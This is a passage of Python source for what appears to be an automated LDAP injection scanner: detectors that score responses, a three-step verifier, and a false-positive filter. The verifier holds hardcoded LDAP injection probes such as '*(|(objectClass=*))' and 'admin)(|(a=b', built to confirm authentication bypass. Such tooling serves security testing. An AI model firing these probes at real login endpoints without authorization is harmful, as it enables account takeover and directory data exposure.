        baseline: Baseline
    ) -> Optional[DetectionSignal]:
        """
        V7 FIX: AUTH_FAIL → AUTH_SUCCESS or REDIRECT is deterministic proof,
        BUT only if we can confirm this transition does NOT happen with a clean
        safe value. The old code fired on any transition, including apps that
        always redirect after a form POST (e.g., PRG pattern).

        The caller (_injection_engine._handle_signal) must have already run a
        control request. This detector now also checks if the baseline itself
        is AUTH_SUCCESS (session-persisted state bug), and refuses to fire.
        """
        bl_class   = baseline.response_class
        resp_class = classify_response(resp, baseline)

        if bl_class == resp_class:
            return None

        # V7 FIX: Don't fire if baseline is already AUTH_SUCCESS (means user
        # is authenticated — any response change could be normal session drift)
        if bl_class == ResponseClass.AUTH_SUCCESS.value:
            return None

        _TRANSITIONS = {
            (ResponseClass.AUTH_FAIL.value,
             ResponseClass.AUTH_SUCCESS.value): (5.5, True),
            (ResponseClass.AUTH_FAIL.value,
             ResponseClass.REDIRECT.value):     (5.0, True),
            (ResponseClass.STATIC.value,
             ResponseClass.AUTH_SUCCESS.value): (4.5, True),
            (ResponseClass.STATIC.value,
             ResponseClass.REDIRECT.value):     (3.5, False),  # V7: lowered — PRG pattern FP
            (ResponseClass.ERROR.value,
             ResponseClass.AUTH_SUCCESS.value): (3.5, True),   # error recovery
            (ResponseClass.AUTH_FAIL.value,
             ResponseClass.ERROR.value):        (3.0, False),
            (ResponseClass.STATIC.value,
             ResponseClass.ERROR.value):        (2.5, False),
            (ResponseClass.AUTH_SUCCESS.value,
             ResponseClass.ERROR.value):        (2.5, False),
            (ResponseClass.AUTH_SUCCESS.value,
             ResponseClass.AUTH_FAIL.value):    (2.0, False),
            (ResponseClass.REDIRECT.value,
             ResponseClass.ERROR.value):        (2.0, False),
            (ResponseClass.AUTH_SUCCESS.value,
             ResponseClass.STATIC.value):       (0.0, False),  # lockout risk
        }
        key = (bl_class, resp_class)
        score, is_bypass = _TRANSITIONS.get(key, (1.0, False))
        if score == 0.0:
            return None

        return DetectionSignal(
            detector  = "ClassTransition",
            score     = score,
            indicator = (f"Response class: "
                         f"{bl_class} → {resp_class}"),
            evidence  = (f"Baseline class: {bl_class}, "
                         f"Post-injection: {resp_class}"),
        )

    # ── Detector 2: LDAP Error (HIGH priority) ───────────────────────────────

    def _d2_ldap_error(
        self,
        resp: requests.Response,
        baseline: Baseline
    ) -> Optional[DetectionSignal]:
        """
        V7 FIX: Two-tier LDAP error scoring.
        HIGH-confidence patterns (javax.naming, DSID-*, LDAPException) = 3.5
        LOW-confidence patterns (invalid filter, result code, no such object) = 1.5
        LOW patterns require a concurrent HIGH signal to count toward CONFIRMED.
        """
        body = resp.text or ""
        json_err = ""
        if "application/json" in resp.headers.get("Content-Type", ""):
            try:
                j = resp.json()
                if isinstance(j, dict):
                    for k in ("error","message","msg","detail","exception",
                              "errorMessage","error_description"):
                        v = j.get(k, "")
                        if isinstance(v, str) and v:
                            json_err += " " + v
            except Exception:
                pass

        combined = body + " " + json_err

        # Only fire if error is new (not in baseline)
        if LDAP_ERRORS_RE.search(baseline.body) or LDAP_ERRORS_LOW_RE.search(baseline.body):
            return None

        # HIGH confidence match
        m_high = LDAP_ERRORS_RE.search(combined)
        if m_high:
            snippet = combined[max(0, m_high.start()-5):m_high.end()+80].strip()[:100]
            return DetectionSignal(
                detector  = "LDAPError",
                score     = 3.5,
                indicator = f"LDAP error string (HIGH): {snippet!r}",
                evidence  = snippet,
            )

        # LOW confidence match — lower score, won't alone reach CONFIRMED threshold
        m_low = LDAP_ERRORS_LOW_RE.search(combined)
        if m_low:
            snippet = combined[max(0, m_low.start()-5):m_low.end()+80].strip()[:100]
            return DetectionSignal(
                detector  = "LDAPErrorLow",
                score     = 1.5,
                indicator = f"LDAP error string (LOW): {snippet!r}",
                evidence  = snippet,
            )

        return None

    # ── Detector 3: Behavioral (HIGH priority) ───────────────────────────────

    def _d3_behavioral(
        self,
        resp: requests.Response,
        baseline: Baseline
    ) -> Optional[DetectionSignal]:
        """Auth-aware behavioral change detection."""
        body = resp.text or ""
        json_body = ""
        if "application/json" in resp.headers.get("Content-Type", ""):
            try:
                j = resp.json()
                json_body = " ".join(str(v) for v in j.values() if isinstance(v, str))
            except Exception:
                pass
        combined = body + " " + json_body

        indicators: List[str] = []
        score_high = 0.0
        score_low  = 0.0

        # Auth success keyword appeared - HIGH
        if (AUTH_SUCCESS_HIGH_RE.search(combined)
                and not AUTH_SUCCESS_HIGH_RE.search(baseline.body)):
            score_high += 2.5
            indicators.append("Auth-success (high-confidence) keyword appeared")

        # Auth success keyword appeared - LOW
        if (AUTH_SUCCESS_LOW_RE.search(combined)
                and not AUTH_SUCCESS_LOW_RE.search(baseline.body)):
            score_low += 1.0
            indicators.append("Auth-success (low-confidence) keyword candidate appeared")

        # Auth failure disappeared
        bl_fail = (AUTH_FAIL_RE.search(baseline.body)
                   or AUTH_FAIL_HTML_RE.search(baseline.body))
        inj_fail= (AUTH_FAIL_RE.search(combined)
                   or AUTH_FAIL_HTML_RE.search(combined))
        if bl_fail and not inj_fail:
            score_high += 2.0
            indicators.append("Auth failure indicator disappeared")

        # Login form vanished
        # Guard: verify baseline form was HTML-rendered (action= attribute)
        baseline_had_real_form = 'action=' in baseline.body.lower() if baseline.has_form else False
        if (baseline.has_form and baseline_had_real_form
                and not re.search(r"<form[\s>]", combined, re.I)):
            score_high += 1.5
            indicators.append("Login form absent post-injection")

        # New session cookies
        new_ck = {
            c.name for c in resp.cookies
            if re.search(
                r"session|auth|token|jwt|sid|access",
                c.name, re.I)
        } - baseline.cookies
        if new_ck:
            score_high += 2.0
            indicators.append(
                f"New auth cookies issued: {sorted(new_ck)}")

        # HTTP status escalation
        if (resp.status_code == 200
                and baseline.status in (400, 401, 403)):
            score_high += 2.5
            indicators.append(
                f"HTTP {baseline.status}→200 status escalation")

        # Redirect to protected path
        if resp.status_code in (301, 302, 303, 307, 308):
            loc = resp.headers.get("Location","")
            if PROTECTED_PATH_RE.search(loc):
                score_high += 2.5
                indicators.append(
                    f"Redirect to protected path: {loc!r}")

        # Aggregate scores: LOW signals only add when there's a HIGH anchor (Fix 8)
        total_score = score_high
        if score_high >= 4.0 and score_low > 0:
            total_score += score_low * 0.5  # 50% weight for low-confidence
        
        # Apply behavioral weight parameter from config
        sensitivity = self._cfg.behavioral_sensitivity
        total_score *= sensitivity

        if total_score <= 0:
            return None

        snippet = body[:200].replace("\n", " ")
        if len(body) > 200: snippet += "..."

        return DetectionSignal(
            detector  = "Behavioral",
            score     = total_score,
            indicator = " | ".join(indicators),
            evidence  = snippet,
        )

    # ── Detector 4: Structural Diff (MEDIUM priority) ────────────────────────

    def _d4_structural(
        self,
        resp: requests.Response,
        baseline: Baseline
    ) -> Optional[DetectionSignal]:
        """
        Structural similarity delta calibrated to volatility.
        Disabled on HIGHLY_DYNAMIC endpoints.
        """
        if baseline.highly_dynamic:
            return None

        diff = sim_delta(baseline.body, resp.text or "")
        if diff < baseline.diff_threshold:
            return None

        # Additional check: diff must exceed length variance
        if baseline.len_variance > 0:
            expected_var_ratio = (
                baseline.len_variance ** 0.5
            ) / max(baseline.body_len, 1)
            if diff < expected_var_ratio * 2.5:
                return None

        score = min(diff * 5.0, 2.5)
        return DetectionSignal(
            detector  = "StructuralDiff",
            score     = score,
            indicator = (f"Response structure changed: "
                         f"Δ={diff:.1%} "
                         f"(threshold={baseline.diff_threshold:.1%})"),
            evidence  = f"sim_delta={diff:.3f}",
        )

    # ── Detector 5: Boolean Differential (MEDIUM priority) ───────────────────

    def _d5_boolean(
        self,
        true_body:  str,
        false_body: str,
        baseline:   Baseline
    ) -> Optional[DetectionSignal]:
        """
        TRUE/FALSE differential — requires paired probes.
        Disabled on HIGHLY_DYNAMIC endpoints.
        Two conditions required to avoid FP from dynamic pages:
          1. TRUE vs FALSE delta >= bool_threshold
          2. FALSE vs baseline delta < diff_threshold
        """
        if baseline.highly_dynamic:
            return None
        if not true_body or not false_body:
            return None

        tf_delta  = sim_delta(true_body, false_body)
        fbl_delta = sim_delta(false_body, baseline.body)

        if (tf_delta >= baseline.bool_threshold
                and fbl_delta < baseline.diff_threshold):
            return DetectionSignal(
                detector  = "BooleanDifferential",
                score     = 2.5,
                indicator = (f"Boolean TRUE/FALSE differential: "
                             f"Δtf={tf_delta:.1%} "
                             f"Δfbl={fbl_delta:.1%}"),
                evidence  = (f"TRUE-FALSE Δ={tf_delta:.3f}, "
                             f"FALSE-baseline Δ={fbl_delta:.3f}"),
            )
        return None

    # ── Detector 6: Filter Reflection (MEDIUM priority) ──────────────────────

    def _d6_filter_reflect(
        self,
        resp: requests.Response
    ) -> Optional[DetectionSignal]:
        """LDAP filter fragment reflected in response body."""
        body = resp.text or ""
        m    = LDAP_FILTER_REFLECT_RE.search(body)
        if not m:
            return None
        # Extract balanced filter fragment
        start  = max(0, m.start() - 5)
        window = body[start:m.end() + 80]
        return DetectionSignal(
            detector  = "FilterReflection",
            score     = 1.5,
            indicator = f"LDAP filter reflected: {window[:80]!r}",
            evidence  = window[:100],
        )

    # ── Detector 7: Timing Oracle (LOW priority) ─────────────────────────────

    def _d7_timing(
        self,
        resp: requests.Response,
        baseline: Baseline
    ) -> Optional[DetectionSignal]:
        """
        Timing anomaly — only runs when other detectors inconclusive.
        Uses calibrated z_min from NetworkJitterCalibrator.
        """
        z_min = (self._cfg.calibrated_z_min
                 or self._cfg.timing_z_min)
        if z_min is None:
            return None
        t = resp.elapsed.total_seconds()
        if not baseline.is_timing_anomaly(t, z_min):
            return None
        z = baseline.z_score(t)
        return DetectionSignal(
            detector  = "TimingOracle",
            score     = 1.5,
            indicator = (f"Timing anomaly: "
                         f"{t*1000:.0f}ms "
                         f"(z={z:.1f}σ)"),
            evidence  = f"t={t:.3f}s z={z:.2f}",
        )

    # ── Detector 8: OOB Callback (CONDITIONAL) ───────────────────────────────

    def _d8_oob(
        self,
        oob_triggered: bool
    ) -> Optional[DetectionSignal]:
        """Out-of-band callback confirmation."""
        if not oob_triggered:
            return None
        return DetectionSignal(
            detector  = "OOBCallback",
            score     = 4.0,
            indicator = "OOB callback received after injection",
            evidence  = "DNS/HTTP callback confirmed",
        )

    # ── Detector 9: Header Anomaly (MEDIUM priority) ─────────────────────────

    def _d9_header_anomaly(
        self,
        resp: requests.Response,
        baseline: Baseline
    ) -> Optional[DetectionSignal]:
        """Detect LDAP evidence in response headers (v3.0)."""
        _LDAP_HEADER_RE = re.compile(
            r"X-LDAP-DN|X-Auth-User|X-Remote-User|X-Username|"
            r"ldap|directory|dn=|cn=|dc=|objectclass", re.I)
        
        # Check if headers changed significantly
        for name, value in resp.headers.items():
            if _LDAP_HEADER_RE.search(name) or _LDAP_HEADER_RE.search(value):
                # Verify if this is a NEW header or changed value
                bl_val = baseline.headers.get(name)
                if bl_val != value:
                    return DetectionSignal(
                        detector="HeaderAnomaly", score=2.0,
                        indicator=f"LDAP-indicative header appeared/changed: {name}",
                        evidence=f"{name}: {value[:100]}")
        return None

    # ── Signal Aggregation ────────────────────────────────────────────────────

    def _aggregate(
        self,
        signals:     List[DetectionSignal],
        resp:        requests.Response,
        baseline:    Baseline,
        shortcircuit: bool = False
    ) -> DetectionResult:
        """
        Aggregate signals into a DetectionResult.
        Applies multi-signal gate:
          - Single-signal pass only for ClassTransition and OOBCallback
          - All others require score >= 3.5 OR two+ detectors
        """
        if not signals:
            return DetectionResult(
                fired=False, score=0.0, signals=[],
                severity=Severity.LOW, evidence="",
            )

        # V7 FIX: Cap total score at 10.0 to prevent overconfident findings
        # when many detectors fire simultaneously on dynamic content
        raw_score   = sum(s.score for s in signals)
        total_score = min(raw_score, 10.0)
        det_names      = [s.detector for s in signals]
        has_transition = "ClassTransition" in det_names
        has_oob        = "OOBCallback"     in det_names
        has_auth       = "Behavioral"      in det_names
        has_error      = "LDAPError"       in det_names
        has_error_low  = "LDAPErrorLow"    in det_names  # V7: low-confidence error tier

        # Multi-signal gate
        n_detectors = len(signals)
        if n_detectors == 1:
            # Single-signal pass allowed only for deterministic signals
            sole = signals[0].detector
            if sole not in ("ClassTransition", "OOBCallback", "HeaderAnomaly"):
                if sole == "Behavioral" and total_score >= 4.0:
                    pass  # Strong behavioral — pass
                elif sole == "LDAPError" and total_score >= 3.5:
                    pass  # High-confidence LDAP error alone — pass
                elif sole == "LDAPErrorLow":
                    # V7 FIX: Low-confidence error alone never fires
                    return DetectionResult(
                        fired=False, score=total_score,
                        signals=signals, severity=Severity.LOW,
                        evidence="LDAPErrorLow alone — insufficient (requires corroborating signal)",
                    )
                else:
                    return DetectionResult(
                        fired=False, score=total_score,
                        signals=signals, severity=Severity.LOW,
                        evidence="Single weak signal — insufficient",
                    )

        # Minimum score gate (multi-signal)
        if n_detectors >= 2 and total_score < 2.0:
            return DetectionResult(
                fired=False, score=total_score,
                signals=signals, severity=Severity.LOW,
                evidence="Multi-signal but score too low",
            )

        has_auth_bypass = bool(
            has_transition
            or (has_auth
                and any("bypass" in s.indicator.lower()
                        or "success" in s.indicator.lower()
                        for s in signals))
        )

        resp_class = classify_response(resp, baseline)
        sev, reason = severity_from_score(
            total_score, has_auth_bypass, has_error)
        evidence = "; ".join(
            s.indicator for s in signals[:3])

        return DetectionResult(
            fired           = True,
            score           = total_score,
            signals         = signals,
            severity        = sev,
            evidence        = evidence,
            has_auth_bypass = has_auth_bypass,
            has_error       = has_error,
            response_class  = resp_class,
        )

    def run(
        self,
        resp:          requests.Response,
        baseline:      Baseline,
        payload:       Payload,
        true_body:     Optional[str] = None,
        false_body:    Optional[str] = None,
        oob_triggered: bool = False,
    ) -> DetectionResult:
        """
        Run all detectors. Returns DetectionResult.
        Detectors run in priority order.
        ClassTransition short-circuits immediately on fire.
        Timing runs only when other detectors are inconclusive.
        """
        signals: List[DetectionSignal] = []

        # D1: Class Transition (shortcircuit)
        d1 = self._d1_class_transition(resp, baseline)
        if d1:
            signals.append(d1)
            return self._aggregate(
                signals, resp, baseline, shortcircuit=True)

        # D2: LDAP Error
        d2 = self._d2_ldap_error(resp, baseline)
        if d2:
            signals.append(d2)

        # D3: Behavioral
        d3 = self._d3_behavioral(resp, baseline)
        if d3:
            signals.append(d3)

        # D4: Structural Diff
        d4 = self._d4_structural(resp, baseline)
        if d4:
            signals.append(d4)

        # D5: Boolean Differential (requires pre-computed bodies)
        if true_body and false_body:
            d5 = self._d5_boolean(true_body, false_body, baseline)
            if d5:
                signals.append(d5)

        # D6: Filter Reflection
        d6 = self._d6_filter_reflect(resp)
        if d6:
            signals.append(d6)

        # ← C2.2 FIX: Wire D9 Header Anomaly into pipeline (between D6 and D8)
        d9 = self._d9_header_anomaly(resp, baseline)
        if d9:
            signals.append(d9)

        # D8: OOB (before timing — higher priority)
        d8 = self._d8_oob(oob_triggered)
        if d8:
            signals.append(d8)

        # D7: Timing — only run when other signals inconclusive
        total_so_far = sum(s.score for s in signals)
        if total_so_far < 2.0: # Fix 7
            d7 = self._d7_timing(resp, baseline)
            if d7:
                signals.append(d7)

        return self._aggregate(signals, resp, baseline)

# ═══════════════════════════════════════════════════════════════════════════════
# §16  PHASE 6 — VERIFICATION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

def binomial_cdf(k: int, n: int, p: float = 0.5) -> float:
    """
    ENHANCEMENT #6: Compute binomial CDF for statistical significance testing.
    Returns P(X <= k) where X ~ Binomial(n, p).
    Used to replace simple 2/3 threshold with proper statistical test.
    """
    from math import comb
    cdf = 0.0
    for i in range(k + 1):
        cdf += comb(n, i) * (p ** i) * ((1 - p) ** (n - i))
    return cdf

def is_statistically_significant(hits: int, trials: int, alpha: float = 0.05, p_null: float = 0.5) -> bool:
    """
    ENHANCEMENT #6: Determine if replay hits are statistically significant.
    H0: P(injection works) = 0.5 (random/baseline behavior)
    H1: P(injection works) > 0.5
    Returns True if p-value < alpha (reject H0, signal is significant).
    """
    # Right-tailed test: p-value = P(X >= observed | H0)
    cdf_value = binomial_cdf(hits - 1, trials, p_null)
    p_value = 1.0 - cdf_value
    return p_value < alpha

class ThreeStepVerifier:
    """
    Three-step deterministic verification proof chain.

    Non-auth endpoints:
      Step 1 — TRUE probe:  altered response vs baseline
      Step 2 — FALSE probe: baseline-like response
      Step 3 — REPLAY:      original payload triggers 2/3

    Auth endpoints (three-way differential):
      Step 1 — TRUE probe:  altered response
      Step 2 — PARSE ERROR: different from BOTH baseline AND true-probe
      Step 3 — REPLAY:      original payload triggers 2/3

    Grade assignment:
      CONFIRMED  = Steps 1+2+3 pass  (score >= 105 non-auth, 110 auth)
      PROBABLE   = Steps 1+3 pass, step 2 inconclusive
      CANDIDATE  = Step 1 passes, replay inconsistent
      REJECTED   = Step 1 fails
    """

    # TRUE probes — try all, stop at first positive
    _TRUE_PROBES = [
        "*(|(objectClass=*))",
        "*(cn=*)",
        "*(|(cn=*)(uid=*))",
        "*",
        "admin)(|(a=b",
        "*(|(uid=admin))",
    ]

    # V7 FIX: FALSE probes use syntactically valid LDAP filters that will never
    # match any real entries, avoiding "no such user" error paths on AD/OpenLDAP
    # that were previously misclassified as "fired" by the error detector.
    _FALSE_PROBES = [
        "*(objectClass=\\00ZZZNOMATCH)",    # null prefix — valid syntax, no entries
        "*(cn=\\ff\\fe\\00NOMATCH)",        # hex garbage — valid, zero results
        "*(uid=\\00\\00\\00NEVER)",         # triple null — valid, zero results
    ]

    # Parse-error probes for auth endpoint three-way test
    _PARSE_ERROR_PROBES = [
        ")((BROKEN_LDAP_SYNTAX_v2_99z",
        "(&(INVALID(((SYNTAX",
        ")(BROKEN)(",
        "*)(|(!(objectClass=*)))(",
        "(&(&(&(uid=*))))(|(",
        "*)))))))))))))))",
        "(((((((((((((((",
        "&",
        "|",
        "!(!(!(!(!(!(!(!(!(!(!(!(!(!((",
        "*()",
        "*)((&(",
    ]

    def __init__(self, client: HTTPClient,
                 pipeline: DetectionPipeline,
                 cfg: ScanConfig,
                 budget: AdaptiveBudgetManager):
        self._client   = client
        self._pipeline = pipeline
        self._cfg      = cfg
        self._budget   = budget

    def _check_lockout(self, resp: requests.Response) -> bool:
        """Check if response indicates an account lockout (v3.0)."""
        return bool(resp is not None and _LOCKOUT_RE.search(resp.text or ""))

    def _send(self, ep: Endpoint,
              param: str,
              value: str,
              phase: str = "verification"
              ) -> Optional[requests.Response]:
        data = build_injection_data(ep, param, value)
        # Notify user verification is happening on stderr
        print(f"\r\033[2K[*] Verifying signal at {ep.url}:{param}...", end="", file=sys.stderr)
        return self._client.send_endpoint(ep, data, phase=phase)

    def _layer1_benign_control(
        self, ep: Endpoint, param: str, baseline: Baseline,
        payload: Payload
    ) -> Tuple[bool, str]:
        """Step 1: Benign replay to confirm environment hasn't shifted."""
        from_v6 = self._cfg.deterministic_suffix
        
        # C1.2 FIX: Use genuinely safe values, not replay_params which can be empty
        data = {p: safe_val(p) for p in ep.params}
        if param in data:
            data[param] = safe_val(param)
            
        resp = self._client.send_endpoint(ep, data, phase="verification")
        if resp is None:
            return True, "L1: no response for control"
        result = self._pipeline.run(resp, baseline, payload)
        if result.fired:
            return False, "L1: benign input also triggers — FP likely"
        return True, "L1: control clean"

    def _step1_true_probe(
        self, ep: Endpoint, param: str,
        baseline: Baseline
    ) -> Tuple[bool, str, str]:
        """
        Try all TRUE probes, stop at first positive signal.
        Returns (passed, probe_used, evidence).
        """
        for probe_raw in self._TRUE_PROBES:
            # Draw from emergency pool when verifying
            if not self._budget.acquire_verification():
                if not self._budget.acquire_emergency():
                    return False, "", "Budget exhausted"
            resp = self._send(ep, param, probe_raw,
                              phase="verification")
            if resp is None:
                continue
            
            body = resp.text or ""
            diff = sim_delta(baseline.body, body)
            
            # Explicit per-probe logging for debugging verification failures
            verbose(f"  Step1 probe {probe_raw!r}: diff={diff:.3f} threshold={baseline.diff_threshold:.3f}")
            
            if diff >= baseline.diff_threshold:
                return (True, probe_raw,
                        f"TRUE diff={diff:.1%}")
            if LDAP_ERRORS_RE.search(body):
                return (True, probe_raw,
                        "TRUE: LDAP error triggered")
            # Auth endpoint: form disappears
            if (ep.is_auth_ep and baseline.has_form
                    and not re.search(
                        r"<form[\s>]", body,
                        re.I)):
                return (True, probe_raw,
                        "TRUE: login form vanished")
        return False, "", "Step 1 failed: no TRUE probe triggered"

    def _step2_false_non_auth(
        self, ep: Endpoint, param: str,
        baseline: Baseline,
        true_body: str = ""
    ) -> Tuple[bool, str]:
        """
        V7 FIX: Differential TRUE/FALSE oracle for non-auth endpoints.

        Old approach: just checked FALSE~baseline (weak — doesn't prove injection controls output).
        New approach: confirms TRUE≠FALSE AND FALSE~baseline (both conditions required).
        This matches how Burp Scanner and Invicti verify blind injection:
          1. TRUE payload → different response from baseline
          2. FALSE payload → same response as baseline
          3. TRUE response ≠ FALSE response (proves the LDAP query controls output)
        All three conditions must hold to pass Step 2.
        """
        if not self._budget.acquire_verification():
            self._budget.acquire_emergency()

        false_raw = random.choice(self._FALSE_PROBES)
        resp      = self._send(ep, param, false_raw, phase="verification")
        if resp is None:
            return False, "No response for FALSE probe"

        false_body = resp.text or ""
        diff_from_bl    = sim_delta(baseline.body, false_body)
        diff_true_false = sim_delta(true_body, false_body) if true_body else 1.0

        # Condition 1: FALSE response is baseline-like
        false_is_baseline_like = (diff_from_bl < baseline.diff_threshold)
        # Condition 2: TRUE and FALSE responses differ (proves oracle control)
        true_false_differ = (diff_true_false >= baseline.diff_threshold * 0.5)

        verbose(f"  Step2 FALSE: Δbl={diff_from_bl:.3f} (thr={baseline.diff_threshold:.3f}) "
                f"Δtrue_false={diff_true_false:.3f}")

        if false_is_baseline_like and true_false_differ:
            return True, (f"Differential oracle: FALSE~baseline Δbl={diff_from_bl:.1%} "
                          f"TRUE≠FALSE Δ={diff_true_false:.1%}")
        if not false_is_baseline_like:
            return False, f"FALSE probe too different from baseline (Δ={diff_from_bl:.1%})"
        if not true_false_differ:
            return False, f"TRUE and FALSE responses indistinct (Δ={diff_true_false:.1%}) — not a boolean oracle"
        return False, "Step 2 differential oracle failed"

    def _step2_parse_error_auth(
        self, ep: Endpoint, param: str,
        baseline: Baseline,
        true_body: str
    ) -> Tuple[bool, str]:
        """
        Three-way differential for auth endpoints.
        Parse error response must differ from BOTH baseline AND true-probe.
        This is the fix for auth endpoint false positives.
        """
        if not self._budget.acquire_verification():
            self._budget.acquire_emergency()
        for err_raw in self._PARSE_ERROR_PROBES:
            resp = self._send(ep, param, err_raw,
                              phase="verification")
            if resp is None:
                continue
            err_body = resp.text or ""
            diff_from_bl   = sim_delta(baseline.body, err_body)
            diff_from_true = sim_delta(true_body,     err_body)
            # Three distinct shapes = confirmed injection
            if (diff_from_bl   >= baseline.diff_threshold * 0.5
                    and diff_from_true >= baseline.diff_threshold * 0.5):
                return (True,
                        f"Three-way: Δbl={diff_from_bl:.1%} "
                        f"Δtrue={diff_from_true:.1%}")
        return (False,
                "Parse-error response not distinct "
                "from baseline and TRUE probe")

    def _step3_replay(
        self, ep: Endpoint, param: str,
        payload: str, baseline: Baseline
    ) -> Tuple[int, str, bool]:
        """
        ENHANCEMENT #6: Replay payload with configurable count and statistical significance testing.
        Previously: 3 replays with 2/3 threshold (inadequate for high-variability endpoints).
        Now: Configurable replays (default 5, min 5) with binomial statistical test (p < 0.05).
        Uses deterministic replay_params for consistency.
        Returns (hit_count, evidence, lockout_detected).
        """
        hits = 0
        lockout_detected = False
        
        # ENHANCEMENT #6: Use configurable replay_count from config (min 5 for statistical power)
        replay_count = max(5, self._cfg.replay_count)

        ep_replay = Endpoint(
            url           = ep.url,
            method        = ep.method,
            params        = ep.params,
            source        = ep.source,
            auth_state    = ep.auth_state,
            is_auth_ep    = ep.is_auth_ep,
            ldap_prob     = ep.ldap_prob,
            use_json      = ep.use_json,
            # Use baseline.replay_params (deterministic) not ep.default_params
            default_params= baseline.replay_params or ep.default_params,
        )
        for i in range(replay_count):
            if not self._budget.acquire_verification():
                if not self._budget.acquire_emergency():
                    break
            resp = self._send(ep_replay, param, payload,
                              phase="verification")
            if resp is None:
                continue

            if self._check_lockout(resp):
                lockout_detected = True

            diff = sim_delta(baseline.body, resp.text or "")
            if (diff >= baseline.diff_threshold
                    or LDAP_ERRORS_RE.search(resp.text or "")
                    or (ep.is_auth_ep
                        and baseline.has_form
                        and not re.search(
                            r"<form[\s>]",
                            resp.text or "", re.I))):
                hits += 1
            time.sleep(random.uniform(0.05, 0.15))  # v3.0: jitter to defeat cache
        
        # ENHANCEMENT #6: Statistical significance test instead of simple threshold
        is_significant = is_statistically_significant(hits, replay_count, alpha=0.05)
        evidence = f"Replay: {hits}/{replay_count} triggered"
        if is_significant:
            evidence += " [STATISTICALLY SIGNIFICANT p<0.05]"
        else:
            evidence += " [insufficient evidence]"
        if lockout_detected:
            evidence += " (! LOCKOUT DETECTED)"
            
        return hits, evidence, lockout_detected

    def verify(
        self,
        ep:       Endpoint,
        param:    str,
        payload:  str,
        baseline: Baseline,
    ) -> Dict[str, Any]:
        """
        Full 3-step verification. Returns result dict.
        """
        proof: List[str] = []

        # Signal active — unlock emergency pool
        self._budget.signal_active(True)

        try:
            # Step 1 — TRUE probe
            s1_ok, true_pl, s1_ev = self._step1_true_probe(
                ep, param, baseline)
            proof.append(f"STEP1: {s1_ev}")

            if not s1_ok:
                return {
                    "grade":        VerificationGrade.REJECTED,
                    "proof":        proof,
                    "confidence":   0,
                    "step1":        False,
                    "step2":        False,
                    "step3_hits":   0,
                }

            # Fetch TRUE body for three-way comparison
            true_resp = self._send(ep, param, true_pl,
                                   phase="verification")
            true_body = true_resp.text if true_resp else ""

            # Step 2 — FALSE probe (type depends on endpoint)
            if ep.is_auth_ep:
                s2_ok, s2_ev = self._step2_parse_error_auth(
                    ep, param, baseline, true_body)
            else:
                # V7 FIX: Pass true_body for full TRUE/FALSE differential oracle
                s2_ok, s2_ev = self._step2_false_non_auth(
                    ep, param, baseline, true_body=true_body)
            proof.append(f"STEP2: {s2_ev}")

            # Step 3 — Replay
            hits, s3_ev, lockout = self._step3_replay(
                ep, param, payload, baseline)
            proof.append(f"STEP3: {s3_ev}")

            # Grade assignment
            # ENHANCEMENT #6: Use statistical significance instead of simple >= 2 threshold
            auth_threshold = 110 if ep.is_auth_ep else 105
            replay_count = max(5, self._cfg.replay_count)
            s3_significant = is_statistically_significant(hits, replay_count, alpha=0.05)
            
            score = (
                (40 if s1_ok else 0)
                + (35 if s2_ok else 0)
                + (hits * 25)
            )

            if s1_ok and s2_ok and s3_significant and not lockout:
                grade = VerificationGrade.CONFIRMED
            elif s1_ok and s3_significant and not s2_ok and not lockout:
                grade = VerificationGrade.PROBABLE
                # Auth endpoints: PROBABLE counts as CONFIRMED
                # because form-disappearance is deterministic
                if ep.is_auth_ep:
                    grade = VerificationGrade.CONFIRMED
            elif s1_ok and (not s3_significant or lockout):
                grade = VerificationGrade.CANDIDATE
            else:
                grade = VerificationGrade.REJECTED

            verify_msg_h(f"  Verification: "
                       f"{ep.url}:{param} → "
                       f"{grade.value} "
                       f"(s={score})")

            return {
                "grade":       grade,
                "proof":       proof,
                "confidence":  min(score, 100),
                "step1":       s1_ok,
                "step2":       s2_ok,
                "step3_hits":  hits,
            }

        finally:
            self._budget.signal_active(False)


class FalsePositiveFilter:
    """
    7-layer false positive gate.
    V7: Added per-endpoint FP tracking — 3+ FP hits logs endpoint as unreliable.
    Runs after DetectionPipeline fires but before creating a HandoffFinding.
    """

    def __init__(self, client: HTTPClient,
                 pipeline: DetectionPipeline,
                 cfg: ScanConfig):
        self._client   = client
        self._pipeline = pipeline
        self._cfg      = cfg
        # V7: Per-endpoint FP counter to detect unreliable endpoints
        self._ep_fp_counts: Dict[str, int] = defaultdict(int)
        self._ep_fp_lock   = threading.Lock()

    def _layer1_benign_control(
        self, ep: Endpoint, param: str,
        payload: Payload, baseline: Baseline
    ) -> Tuple[bool, str]:
        """
        Send deterministic baseline values — must NOT trigger detection.
        """
        # Optimized: use replay_params to ensure minimal variance from baseline
        data = build_injection_data(ep, param, baseline.replay_params.get(param, ""), self._cfg.deterministic_suffix)
        resp = self._client.send_endpoint(
            ep, data, phase="verification")
        if resp is None:
            return True, "L1: no response for control"
        result = self._pipeline.run(resp, baseline, payload)
        if result.fired:
            return (False,
                    "L1: benign input also triggers — FP likely")
        return True, "L1: control clean"

    def _layer2_cross_param(
        self, ep: Endpoint, param: str,
        payload: Payload, baseline: Baseline
    ) -> Tuple[bool, str]:
        """
        Inject same payload into other params.
        If 3+ params all trigger, it's page dynamics.
        """
        other = [p for p in ep.params if p != param][:3]
        if len(other) < 2:
            return True, "L2: insufficient params for cross-test"
        hits = 0
        for op in other:
            data = build_injection_data(ep, op, payload.raw, self._cfg.deterministic_suffix)
            resp = self._client.send_endpoint(ep, data, phase="verification")
            if resp is None:
                continue
            r = self._pipeline.run(resp, baseline, payload)
            if r.fired:
                hits += 1
        if hits >= 2:
            return (False,
                    f"L2: {hits}/{len(other)} cross-params "
                    f"trigger — page dynamics FP")
        return True, f"L2: {hits}/{len(other)} cross hits"

    def _layer3_structural_uniqueness(
        self, inj_body: str, baseline: Baseline,
        control_body: str
    ) -> Tuple[bool, str]:
        """
        V7 FIX: Two-track uniqueness check.
        Track A: If a HIGH-confidence LDAP error pattern is in inj_body but NOT in control_body
                 → pass regardless of similarity score (targeted error diff).
        Track B: Structural similarity — inj must differ from baseline AND control.

        The old single-track approach (sim_delta only) failed in two ways:
        1. Apps with embedded timestamps made safe+injected differ by <5% even with LDAP error
        2. Apps with A/B testing made safe+injected differ by >5% with no injection

        Track A solves case 1: LDAP error in injection but not control is definitive.
        Track B handles cases where no error appears but behavior changes.
        """
        diff_bl  = sim_delta(baseline.body, inj_body)
        diff_ctl = sim_delta(control_body,  inj_body) if control_body else 1.0

        # Track A: Targeted LDAP error presence in injection but not in control
